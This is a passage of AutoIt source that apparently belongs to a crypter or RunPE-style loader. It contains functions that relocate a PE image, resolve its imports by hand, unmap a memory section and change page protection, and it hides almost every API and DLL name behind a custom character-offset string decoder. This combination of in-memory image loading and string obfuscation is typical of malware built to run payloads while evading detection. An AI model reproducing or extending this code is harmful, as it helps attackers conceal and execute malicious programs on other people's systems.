		$TIMAGE_BASE_RELOCATION = DLLSTRUCTCREATE(STRINGDEC("lwjrdmzzfbhfvidpgcrfuusyhqgqwo", "-8,0,5,0,0,-77,-36,-17,12,18,13,-5,-10,-40,0,-12,11,2,1,13,-58,-85,-15,-2,7,1,-3,-81,-36,-6,14,-18,-27,-12,-34,-1,-11,-23,5"), $PDATA + $IRELATIVEMOVE)
		$IVIRTUALADDRESS = DLLSTRUCTGETDATA($TIMAGE_BASE_RELOCATION, STRINGDEC("vaxsqldqdfzpvxgvsyjbhlaivzeixa", "-32,8,-6,1,4,-11,8,-48,0,-2,-8,-11,-3,-5"))
		$ISIZEOFBLOCK = DLLSTRUCTGETDATA($TIMAGE_BASE_RELOCATION, STRINGDEC("bnuwrciljwllofmmhxrxtcxcwgidkq", "-15,-5,5,-18,-35,3,-39,0,5,-20,-1"))
		$INUMBEROFENTRIES = ($ISIZEOFBLOCK - 8) / 2
		$TENRIES = DLLSTRUCTCREATE(STRINGDEC("ljdrmcjigcsrmjeayaoxiftpaygyrv", "11,5,14,-14,-18") & $INUMBEROFENTRIES & "]", DLLSTRUCTCREATEHOOK($TIMAGE_BASE_RELOCATION) + 8)
		For $I = 1 To $INUMBEROFENTRIES
			$IDATA = DLLSTRUCTGETDATA($TENRIES, 1, $I)
			If BITSHIFT($IDATA, 12) = $IFLAG Then
				$TADDRESS = DLLSTRUCTCREATE(STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $PADDRESSNEW + $IVIRTUALADDRESS + BITAND($IDATA, 4095))
				DLLSTRUCTSETDATA($TADDRESS, 1, DLLSTRUCTGETDATA($TADDRESS, 1) + $IDELTA)
			EndIf
		Next
		$IRELATIVEMOVE += $ISIZEOFBLOCK
	WEnd
	Return 1
EndFunc   ;==>FIXRELOC
Func FIXIMPORTS($TDATA, $HINSTANCE)
	Local $PIMPORTDIRECTORY = DLLSTRUCTCREATEHOOK($TDATA)
	Local $HMODULE, $PFUNCNAME, $TFUNCNAME, $SFUNCNAME, $PFUNCADDRESS
	Local $TIMAGE_IMPORT_MODULE_DIRECTORY, $PMODULENAME, $TMODULENAME
	Local $TBUFFEROFFSET2, $IBUFFEROFFSET2
	Local $IINITIALOFFSET, $IINITIALOFFSET2, $IOFFSET
	Local Const $IPTRSIZE = DLLSTRUCTGETSIZE(DLLSTRUCTCREATE(STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4")))
	While 1
		$TIMAGE_IMPORT_MODULE_DIRECTORY = DLLSTRUCTCREATE(STRINGDEC("oslxljafhlcqevhnveycpapujzmbxp", "-11,4,3,-6,-8,-74,-15,-16,-39,-29,15,-8,2,-13,6,-13,-10,-31,-16,15,3,19,-28,-13,11,-12,-2,-39") & STRINGDEC("fgdaygtgtzkeiogftjplkmhulfitfm", "-2,16,11,17,-21,-71,-32,2,-7,-21,-39,-4,11,-10,-20,14,-19,3,0,-49") & STRINGDEC("dhbrrjgfaqtelpmlwzkkhrxzhyhysq", "0,15,13,0,-14,-74,-33,9,17,6,-19,13,-8,-11,5,-41,-15,-25,-2,3,-45") & STRINGDEC("dilcwosqkyuaqkznzozwybrpzcyodc", "0,14,3,15,-19,-79,-33,-27,-42,-44,-6,3,4,1,-21,-32,-25,-2,-21,-60") & STRINGDEC("usmbngezbsbjfvccnqokanpjizqujz", "-17,4,2,16,-10,-71,-19,-36,-33,-45,7,8,13,-2,-15,5,7,-3,-4"), $PIMPORTDIRECTORY)
		If Not DLLSTRUCTGETDATA($TIMAGE_IMPORT_MODULE_DIRECTORY, STRINGDEC("hexycwgtfbcwsreqoojrsmjddzzoxj", "-22,-15,-55,-51,6,-5,12,0,-18,6,18,-9,-8")) Then ExitLoop
		$PMODULENAME = $HINSTANCE + DLLSTRUCTGETDATA($TIMAGE_IMPORT_MODULE_DIRECTORY, STRINGDEC("uantbqllttuevibcqdtrmnwucvxdfb", "-35,-11,-45,-39,13,-13,9,0,-15,-38,-20,8,-17"))
		$TMODULENAME = DLLSTRUCTCREATE(STRINGDEC("upjquvutslafzbgfjxkhknbxlzazrp", "-18,-8,-9,1,-85,-40,-20,-7,-14,-17") & _WINAPI_STRINGLENA($PMODULENAME) & "]", $HINSTANCE + DLLSTRUCTGETDATA($TIMAGE_IMPORT_MODULE_DIRECTORY, STRINGDEC("uantbqllttuevibcqdtrmnwucvxdfb", "-35,-11,-45,-39,13,-13,9,0,-15,-38,-20,8,-17")))
		$HMODULE = _WINAPI_LOADLIBRARY(DLLSTRUCTGETDATA($TMODULENAME, STRINGDEC("ocmqkssqolnvxuhrhmkzgjdofxgnvv", "-33,-2,0,-12")))
		$IINITIALOFFSET = $HINSTANCE + DLLSTRUCTGETDATA($TIMAGE_IMPORT_MODULE_DIRECTORY, STRINGDEC("hexycwgtfbcwsreqoojrsmjddzzoxj", "-22,-15,-55,-51,6,-5,12,0,-18,6,18,-9,-8"))
		$IINITIALOFFSET2 = $HINSTANCE + DLLSTRUCTGETDATA($TIMAGE_IMPORT_MODULE_DIRECTORY, STRINGDEC("zfbhtwtfudtxfnayqiivdgxbknheos", "-40,-16,-33,-25,-2,-14,-13,3,-7,-3,-8,-50,3,4,18,-5,-29,-1,12,-8,7"))
		If $IINITIALOFFSET2 = $HINSTANCE Then $IINITIALOFFSET2 = $IINITIALOFFSET
		$IOFFSET = 0
		While 1
			$TBUFFEROFFSET2 = DLLSTRUCTCREATE(STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $IINITIALOFFSET2 + $IOFFSET)
			$IBUFFEROFFSET2 = DLLSTRUCTGETDATA($TBUFFEROFFSET2, 1)
			If Not $IBUFFEROFFSET2 Then ExitLoop
			If BITSHIFT(BINARYMID($IBUFFEROFFSET2, $IPTRSIZE, 1), 7) Then
				$PFUNCADDRESS = GETPROCADDRESS($HMODULE, BITAND($IBUFFEROFFSET2, 65535))
			Else
				$PFUNCNAME = $HINSTANCE + $IBUFFEROFFSET2 + 2
				$TFUNCNAME = DLLSTRUCTCREATE(STRINGDEC("ztupaktkcocqtjwswsimusgwiiaevm", "-3,-5,-3,-12,-65,-28,-2,-7,6,-1,-2,-5,-57,-74,-20,-11,-22,-1,-73,-31,-20,-6,-2,-28") & _WINAPI_STRINGLENA($PFUNCNAME) & "]", $HINSTANCE + $IBUFFEROFFSET2)
				$SFUNCNAME = DLLSTRUCTGETDATA($TFUNCNAME, STRINGDEC("ocmqkssqolnvxuhrhmkzgjdofxgnvv", "-33,-2,0,-12"))
				$PFUNCADDRESS = GETPROCADDRESS($HMODULE, $SFUNCNAME)
			EndIf
			DLLSTRUCTSETDATA(DLLSTRUCTCREATE(STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $IINITIALOFFSET + $IOFFSET), 1, $PFUNCADDRESS)
			$IOFFSET += $IPTRSIZE
		WEnd
		$PIMPORTDIRECTORY += 20
	WEnd
	Return 1
EndFunc   ;==>FIXIMPORTS
Func UNMAPVIEWOFSECTION($PADDRESS)
	Local $ACALL = DLLCALL(STRINGDEC("lolaswlneqglatvujvwqviroebtdfh", "2,5,-8,11,-7,-73,-8,-2,7"), STRINGDEC("pzsmwgeaptrhqhifwxjgngsprkjntw", "-7,-12,1"), STRINGDEC("egwadzchaebonrunjtdzissolfqgmo", "-23,13,-34,13,9,-25,13,-18,8,0,21,-32,-8,-31,-16,-11,10,-11,11,-12"), STRINGDEC("wvyhizikrnukotjwuqbnvlyvoqlxdb", "-15,-21,-11,-4,3,-21"), _WINAPI_GETCURRENTPROCESS(), STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $PADDRESS)
	If @error Or $ACALL[0] Then Return SETERROR(1, 0, False)
	Return True
EndFunc   ;==>UNMAPVIEWOFSECTION
Func VIRTUALPROTECT($PADDRESS, $ISIZE, $IPROTECTION)
	Local $ACALL = DLLCALL(STRINGDEC("gisqrnanonrphwezrnlerrcpslnegz", "4,-4,-1,-3,-13,-2,-46,-60,-65,-10,-6,-4"), STRINGDEC("bgerenbiyscuvxftpthytojojwggvx", "0,8,10,-6"), STRINGDEC("wpxbildbjcxtjlduknwzcanprgheeu", "-33,-7,-6,18,12,-11,8,-18,8,12,-4,-15,-7,8"), STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $PADDRESS, STRINGDEC("qquzgqwwlawbxandwwcglmgrcbifhj", "-13,6,-6,-8,-3,-18,-7,-3,6"), $ISIZE, STRINGDEC("fjmrgpoktxdxalfupypesalaixldpw", "-2,13,2,0,-3"), $IPROTECTION, STRINGDEC("nnpgmnrtuodmqfsmzcfvlmzjmztrro", "-10,9,-1,11,-9,-68"), 0)
	If @error Or Not $ACALL[0] Then Return SETERROR(1, 0, 0)
	Return 1
EndFunc   ;==>VIRTUALPROTECT
Func GETPROCADDRESS($HMODULE, $VNAME)
	Local $STYPE = STRINGDEC("zdacatdoylubvdmymbssbhfdsgsgol", "-7,16,17")
	If ISNUMBER($VNAME) Then $STYPE = STRINGDEC("rygvobzahsfsgyffoyrxsigagjtisp", "5,-10,11,-18")
	Local $ACALL = DLLCALL(STRINGDEC("gisqrnanonrphwezrnlerrcpslnegz", "4,-4,-1,-3,-13,-2,-46,-60,-65,-10,-6,-4"), STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), STRINGDEC("ejkuftmguocuyhwozahfcvigcwnibd", "-30,-5,9,-37,12,-5,-10,-38,-17,-11,15,-16,-6,11"), STRINGDEC("wvyhizikrnukotjwuqbnvlyvoqlxdb", "-15,-21,-11,-4,3,-21"), $HMODULE, $STYPE, $VNAME)
	If @error Or Not $ACALL[0] Then Return SETERROR(1, 0, 0)
	Return $ACALL[0]
EndFunc   ;==>GETPROCADDRESS
Func STRINGDEC($STRING, $PARAM)
	$STRING = StringToASCIIArray($STRING)
	$PARAM = StringSplit($PARAM, ",", 2)
	$COUNT = 0
	$RETURN = ""
	For $I = 0 To UBound($PARAM) - 1
		$CHAR = $PARAM[$I]
		$COMPARE = $STRING[$COUNT]
		$RETURN &= ChrW($CHAR + $COMPARE)
		If $COUNT = UBound($STRING) - 1 Then
			$COUNT = 0
		Else
			$COUNT = $COUNT + 1
		EndIf
	Next
	Return $RETURN
EndFunc   ;==>STRINGDEC
